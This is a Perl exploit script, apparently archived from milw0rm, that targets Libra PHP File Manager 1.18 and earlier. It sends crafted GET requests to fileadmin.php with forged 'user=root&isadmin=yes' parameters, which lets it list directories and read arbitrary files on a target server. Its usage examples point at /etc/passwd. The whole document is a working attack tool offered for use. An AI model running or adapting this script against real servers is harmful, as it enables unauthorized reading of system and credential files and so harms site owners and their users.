<html><head><title>Libra PHP File Manager <= 1.18 Local File Inclusion Exploit</title></head><pre>#! /usr/bin/perl

# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
# Libra PHP File Manager &lt;= 1.18 / Local File Inclusion Vulnerability
# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

# Program: Libra PHP File Manager
# Version: &lt;= 1.18
# File affected: fileadmin.php
# Download: http://file.sourceforge.net
#
#
# Found by Pepelux &lt;pepelux[at]enye-sec.org&gt;
# eNYe-Sec - www.enye-sec.org
# Greetings to Ka0x for help me with the perl code  :)
#
# You can scale directories and read any file that you have permissions

use LWP::UserAgent;
$ua = LWP::UserAgent-&gt;new;

print &quot;\e[2J&quot;;
system(($^O eq 'MSWin32') ? 'cls' : 'clear');

my ($host, $path, $action) = @ARGV ;

unless($ARGV[2]) {
	print &quot;Usage: perl $0 &lt;host&gt; &lt;path&gt; &lt;action&gt;\n&quot;;
	print &quot;\tex: perl $0 http://site.com /etc/ list\n&quot;;
	print &quot;\tex: perl $0 http://site.com /etc/passwd edit\n&quot;;
	print &quot;Actions:\n&quot;;
	print &quot;   list:\n&quot;;
	print &quot;   edit:\n\n&quot;;
	exit 1;
}

$ua-&gt;agent(&quot;$0/0.1 &quot; . $ua-&gt;agent);
$host = &quot;http://&quot;.$host if ($host !~ /^http:/);
$path = $path.&quot;/&quot; if ($action eq &quot;list&quot; &amp;&amp; $path !~ /\/$/);
$op = &quot;home&quot; if ($action == &quot;list&quot;);

if ($action eq &quot;edit&quot;) {
	$aux = $path;
	$directory = &quot;&quot;;

	do {
		$x = index($aux, &quot;/&quot;);
		$y = length($aux) - $x;
		$directory .= substr($aux, 0, $x+1);
		$aux = substr($aux, $x+1, $y);
	} until ($x == -1);

	$path = $directory;
	$file = $aux;
	$op = &quot;edit&quot;;
}

$url = $host.&quot;/fileadmin.php?user=root&amp;isadmin=yes&amp;op=&quot;.$op.&quot;&amp;folder=&quot;.$path;
$url .= &quot;&amp;fename=&quot;.$file if ($action eq &quot;edit&quot;);

$req = HTTP::Request-&gt;new(GET =&gt; $url);
$req-&gt;header('Accept' =&gt; 'text/html');

$res = $ua-&gt;request($req);

if ($res-&gt;is_success) { 
	$result = $res-&gt;content;

	if ($action eq &quot;edit&quot;) {
		print &quot;Viewing $path$file:\n&quot;;
		print $1,&quot;\n&quot; if($result =~ /name=&quot;ncontent&quot;&gt;(.*)&lt;\/textarea&gt;/s);
	}
	else {
		print &quot;Files in $path:\n&quot;;
		$x = index($result, &quot;Files:&quot;) + 6;
		$result = substr($result, $x, length($result)-$x);
		$result =~ s/&lt;[^&gt;]*&gt;//g;
		$result =~ s/Filename//g;
		$result =~ s/Size//g;
		$result =~ s/Edit//g;
		$result =~ s/Rename//g;
		$result =~ s/Delete//g;
		$result =~ s/Move//g;
		$result =~ s/View//g;
		$result =~ s/Open//g;
		$result =~ s/\d*//g;
		$result =~ s/\s+/\n/g;
		$x = index($result, &quot;Copyright&quot;);
		$result = substr($result, 0, $x);
		print $result;
	}
} 
else { print &quot;Error: &quot; . $res-&gt;status_line . &quot;\n&quot;;}

# milw0rm.com [2008-09-25]</pre></html>